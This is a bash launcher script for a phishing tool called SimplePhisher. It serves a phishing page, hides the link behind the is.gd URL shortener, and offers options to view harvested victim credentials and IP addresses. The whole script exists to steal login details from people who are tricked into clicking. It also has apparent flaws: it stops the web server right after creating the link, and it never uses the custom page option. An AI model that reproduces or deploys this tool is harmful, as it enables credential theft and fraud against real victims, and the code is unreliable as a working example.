#!/bin/bash

# Define the root directory for the phishing tool
if [[ $(uname -o) == *'Android'* ]]; then
        SIMPLEPHISHER_ROOT="/data/data/com.termux/files/usr/opt/simplephisher"
else
        export SIMPLEPHISHER_ROOT="/opt/simplephisher"
fi

# Function to display the help menu
show_help() {
        echo "To run SimplePhisher type \`simplephisher\` in your cmd"
        echo
        echo "Help:"
        echo " -h | help : Print this menu & Exit"
        echo " -c | auth : View Saved Credentials"
        echo " -i | ip   : View Saved Victim IP"
        echo " -g | generate : Generate a phishing link"
        echo " -p | port  : Specify a custom port for the HTTP server (default: 8080)"
        echo " -f | file  : Specify a custom phishing page (default: phishing_page.html)"
        echo
}

# Function to generate a phishing link
generate_phishing_link() {
        # Default values
        PORT=${PORT:-8080}
        PHISHING_PAGE=${PHISHING_PAGE:-"$SIMPLEPHISHER_ROOT/phishing_page.html"}

        # Start an HTTP server to serve the phishing page
        python3 -m http.server $PORT &
        SERVER_PID=$!

        # Get the local IP address
        LOCAL_IP=$(hostname -I | awk '{print $1}')

        # Construct the phishing URL
        PHISHING_URL="http://$LOCAL_IP:$PORT"

        # Use a URL shortening service to shorten the phishing URL
        SHORTENED_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$PHISHING_URL")

        # Stop the HTTP server
        kill $SERVER_PID

        # Log the generated link
        echo "$(date): Phishing link generated: $SHORTENED_URL" >> $SIMPLEPHISHER_ROOT/logs/phishing_links.log

        echo "Phishing link generated: $SHORTENED_URL"
}

# Check the command-line arguments
while [[ $# -gt 0 ]]; do
        case $1 in
                -h|help)
                        show_help
                        exit 0
                        ;;
                -c|auth)
                        cat $SIMPLEPHISHER_ROOT/auth/usernames.dat 2> /dev/null || {
                                echo "No Credentials Found!"
                                exit 1
                        }
                        ;;
                -i|ip)
                        cat $SIMPLEPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
                                echo "No Saved IP Found!"
                                exit 1
                        }
                        ;;
                -g|generate)
                        generate_phishing_link
                        ;;
                -p|port)
                        PORT=$2
                        shift
                        ;;
                -f|file)
                        PHISHING_PAGE=$2
                        shift
                        ;;
                *)
                        echo "Unknown option: $1"
                        show_help
                        exit 1
                        ;;
        esac
        shift
done

# Change to the phishing tool directory and run the main script
cd $SIMPLEPHISHER_ROOT
bash ./simplephisher.sh
